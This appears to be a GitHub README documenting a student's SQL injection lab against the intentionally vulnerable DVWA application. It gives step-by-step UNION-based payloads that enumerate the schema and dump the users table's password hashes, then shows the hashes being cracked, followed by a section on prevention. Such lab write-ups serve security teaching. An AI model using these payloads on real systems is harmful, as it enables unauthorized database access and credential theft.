# SQL Injection Practice Lab (Educational Only)

## Purpose
This repo documents my recent SQL injection practice exercises. It includes vulnerable example code and secure fixes to highlight common mistakes and prevention techniques.

**WARNING: For educational and local testing use ONLY. Do not deploy this publicly or use on any system without authorization.**

## Vulnerabilities Covered
- Basic error-based SQLi



## Objectives

Web applications connected to backend databases may be vulnerable to **SQL injection (SQLi)** attacks. SQL injection occurs when an attacker injects malicious SQL code into application inputs, allowing unauthorized interaction with the database.

This educational lab demonstrates the risks of SQLi in a controlled environment using the **Damn Vulnerable Web Application (DVWA)**. The goals are to:

- **Part 1**: Exploit an SQL injection vulnerability in DVWA to understand how attackers can extract or manipulate data.
- **Part 2**: Research and document effective mitigation strategies to prevent SQLi in real-world applications.


## Background

**SQL injection** is one of the most prevalent and dangerous web application vulnerabilities. It exploits improper handling of user input by inserting malicious SQL statements into queries. Successful attacks can lead to:

- Unauthorized data disclosure (e.g., usernames, passwords, sensitive records)
- Data manipulation or deletion
- Authentication bypass
- Potential full system compromise

This vulnerability arises primarily from dynamic query construction without proper sanitization or parameterization.

**Important Disclaimer**: All activities documented in this repository were performed in a **local, isolated environment** for **educational purposes only**. SQL injection techniques must **never** be used on systems without explicit authorization—doing so is illegal and unethical.

## Required Resources

- A virtual machine 
- Internet access (for research in Part 2)


## Part 1: Exploiting SQL Injection Vulnerability on DVWA

### Step 1: Preparing DVWA for SQL Injection Exploitation

1. Open a web browser and navigate to the DVWA instance at `http://10.6.6.13` (or your local DVWA address).

2. Log in using the default credentials:
   - **Username**: `admin`
   - **Password**: `password`

3. Set the DVWA security level to **Low** to disable protections and allow full demonstration of the vulnerability:
   - Click **DVWA Security** in the left-hand menu.
   - Select **Low** from the dropdown menu.
   - Click **Submit**.

  
  <img width="952" height="903" alt="1 security level change" src="https://github.com/user-attachments/assets/68283836-fbe7-40ba-856b-959cb0f57dcf" />


### Step 2: Confirming the Presence of SQL Injection Vulnerability

1. In the DVWA left-hand menu, click **SQL Injection**.

2. In the **User ID** field, enter the following payload and click **Submit**:
 OR 1=1 #

3. **Expected Result**:
- The page returns records for **all users** in the database instead of a single user.
- Sample output:

ID: ' or 1=1 #
First name: admin
Surname: admin
ID: ' or 1=1 #
First name: Gordon
Surname: Brown

You have entered an “always true” expression that was executed by the database server.
The result is that all entries in the ID field of the database were returned.

### Step 3: Determining the Number of Columns in the Query

1. In the **User ID** field, enter the following payload and click **Submit**:
1' ORDER BY 1 #

2. **Expected Result**:
- The page successfully returns the record for User ID 1:
ID: 1' ORDER BY 1#
First name: admin
Surname: admin


<img width="953" height="961" alt="2 number of fields in the query" src="https://github.com/user-attachments/assets/60e70137-1ace-48bd-8f37-229a1859fa89" />


2. In the **User ID** field, enter the following payload and click **Submit**:
1' ORDER BY 2 #

**Expected Result**:
- The page successfully returns the record for User ID 1:
ID: 1' ORDER BY 2#
First name: admin
Surname: admin


<img width="942" height="962" alt="3 number of fields in the query" src="https://github.com/user-attachments/assets/efe71ee2-d2fb-47b5-b157-29db64c36dba" />


- This confirms that the query supports at least **2 columns**.

3. In the **User ID** field, enter the following payload and click **Submit**:
1' ORDER BY 3 #

**Expected Result**:
- The application returns a SQL error: **"Unknown column '3' in 'order clause'"** (or similar).


<img width="953" height="992" alt="4 number of fields in the query" src="https://github.com/user-attachments/assets/70bb9cf6-bfb3-47a8-9525-b3b03d2d17c1" />


**Conclusion**:
- The error on `ORDER BY 3` while `ORDER BY 2` succeeds indicates that the original query selects exactly **2 columns**.
- This information is critical for crafting effective UNION-based payloads in subsequent exploitation steps



### Step 4: Identifying the Database Management System (DBMS) Version


1. In the **User ID** field, enter the following payload and click **Submit**:
1' OR 1=1 UNION SELECT 1, VERSION() #

2. **Expected Result**:
- The payload uses `UNION` to append an additional row to the original query output.
- Since the query has 2 columns, `SELECT 1, VERSION()` returns:
  - First column: `1` (displayed as a dummy First name)
  - Second column: The database version string (displayed as Surname)
- At the end of the output (or in one of the returned rows), you should see a result similar to:


<img width="956" height="982" alt="5 version database management" src="https://github.com/user-attachments/assets/1a250b8e-f8db-4daf-9d42-c914bb2cdd48" />


The output 5.5.58-0+deb8u1 indicates the DBMS is MySQL version 5.5.58 running on Debian.


### Step 5: Determining the Current Database Name


So far, the application has been confirmed vulnerable to SQL injection, the query uses **2 columns**, and the DBMS is MySQL-compatible.
The next step is to extract schema information, starting with the name of the current database.
1. In the **User ID** field, enter the following payload and click **Submit**:

1' OR 1=1 UNION SELECT 1, DATABASE() #


2. **Expected Result**:
- The `UNION` appends an additional row.
- The column (displayed as **Surname**) reveals the current database name.
- At the end of the output, you should see the following result:

ID: 1’ OR 1=1 UNION SELECT 1, DATABASE()#
First name: 1
Surname: dvwa


<img width="947" height="990" alt="6 database name" src="https://github.com/user-attachments/assets/ffc6c031-340b-48dc-8270-30b5974064b7" />


3. **Conclusion**:
- The function `DATABASE()` returns the name of the database currently in use ( `dvwa` ).
- This information is valuable for further enumeration, such as listing tables and columns within the identified database.


### Step 6: Retrieving Table Names from the `dvwa` Database


1. In the **User ID** field, enter the following payload and click **Submit**:

1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#


2. **Expected Result**:
- The `UNION` query appends rows containing table names from the `dvwa` database.
- Each returned row with **First name: 1** displays a table name in the **Surname** field.
- Typical output in DVWA:


<img width="1912" height="1017" alt="7 table type" src="https://github.com/user-attachments/assets/65335770-c569-439c-87fe-622cd92645ff" />


3. **Conclusion**:
- This payload enumerates all base tables in the `dvwa` database via the `information_schema.tables` system view.
- The identified tables (especially `users`) are prime targets for further exploitation, such as extracting columns or data.

What are the two tables that were found?
guestbook and users



### Step 7: Retrieving Column Names from the `users` Table


Knowing the column names in the `users` table allows targeted extraction of sensitive data during penetration testing.

1. In the **User ID** field, enter the following payload and click **Submit**:
1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#


<img width="1916" height="1012" alt="8 table of interest" src="https://github.com/user-attachments/assets/f79d0273-14ea-44d3-8b29-40ae3184cc60" />


The user column and the password column are of interest because they seem to contain information that can be used for unauthorized access.



### Step 8: Retrieving User Credentials


This final payload extracts the actual usernames and password hashes from the `users` table.

1. In the **User ID** field, enter the following payload and click **Submit**:
1' OR 1=1 UNION SELECT user, password FROM users #


2. **Expected Result**:
- The `UNION` query appends rows containing data from the `users` table.
- The output displays:
  - **First name** column: usernames (e.g., `admin`, `gordonb`, etc.)
  - **Surname** column: corresponding password hashes (MD5 format in DVWA)
- Example results (after any initial legitimate records):


<img width="947" height="998" alt="9 retrieved user credentials" src="https://github.com/user-attachments/assets/b6c267f7-8c4e-4bf4-b9cd-a47b1c331692" />


3. **Conclusion**:
- This successfully dumps sensitive credentials from the database.
The retrieved MD5 hashes can be cracked using tools like Hashcat (for demonstration purposes only)


### Step 9: Cracking the Retrieved Password Hashes


**Important Note**: Password cracking demonstrated here is performed solely on hashes obtained from a local, intentionally vulnerable training environment (DVWA). Cracking hashes without explicit authorization is illegal and unethical.

1. Open a new browser tab and navigate to an online hash cracking tool such as **https://crackstation.net** (a free service for common hash types).
2. Copy one or more of the MD5 password hashes retrieved from the `users` table in the previous step.
3. Paste the hash(es) into the input field on CrackStation.
4. Click **Crack Hashes** (or equivalent).


<img width="952" height="1007" alt="10 cracking password hashes" src="https://github.com/user-attachments/assets/f1e7b2bd-34e2-42d6-b1a7-e14541b2ff04" />


What is the password for the user pablo?


<img width="955" height="1000" alt="11 cracked hash" src="https://github.com/user-attachments/assets/e3281e56-bf2d-4678-bcea-ee8d1915c102" />


letmein


**Conclusion**:
   - This step completes the SQL injection attack chain: vulnerability discovery → data extraction → offline cracking of credentials.
   - In a real engagement, obtaining cleartext passwords would allow full account takeover.



## SQL Injection Mitigation and Prevention


**SQL injection (SQLi)** can be effectively **prevented** by secure coding practices and **mitigated** through layered defenses. The goal is to ensure user input never alters query structure.

### Primary Prevention Techniques (Most Effective)

1. **Parameterized Queries / Prepared Statements**  
   The **recommended** defense. Bind user input as parameters, separating data from SQL code.  

2.  Use Safe ORM Libraries
   Frameworks like Django ORM, Hibernate, or Entity Framework automatically parameterize queries—avoid raw SQL concatenation.

3. Stored Procedures
   Use only if parameterized and without internal dynamic SQL.


### Supporting Mitigation Strategies 


1. Input Validation
   Enforce allow-lists (e.g., expect numeric ID → accept only digits). Combine with parameterization.

2. Least Privilege
   Limit database user permissions (e.g., SELECT-only for web apps).

3. Web Application Firewall (WAF)
   Detect and block common SQLi patterns.

4. Proper Error Handling
   Suppress detailed SQL errors from end users; log them securely server-side.


References:


OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
OWASP Top 10 (A03: Injection)


## Lab Complete: Summary and Key Takeaways


This educational lab successfully demonstrated a complete **SQL injection attack chain** on the Damn Vulnerable Web Application (DVWA) in a controlled, local environment:

- Confirmed the presence of an SQL injection vulnerability
- Determined the number of columns in the query
- Identified the DBMS version and current database name
- Enumerated tables and columns within the database
- Extracted sensitive user credentials (usernames and password hashes)
- Cracked the retrieved password hashes to obtain cleartext passwords

### Key Lessons Learned

- **SQL injection** remains one of the most critical web application vulnerabilities when user input is not properly sanitized.
- Even basic payloads can lead to **full data disclosure** in unprotected applications.
- Information gathered step-by-step (columns, tables, columns, data) enables progressively more damaging exploits.

**Final Reminder**: The techniques shown here are for **educational and authorized testing purposes only**. Unauthorized use against any system is illegal and unethical.

























































































































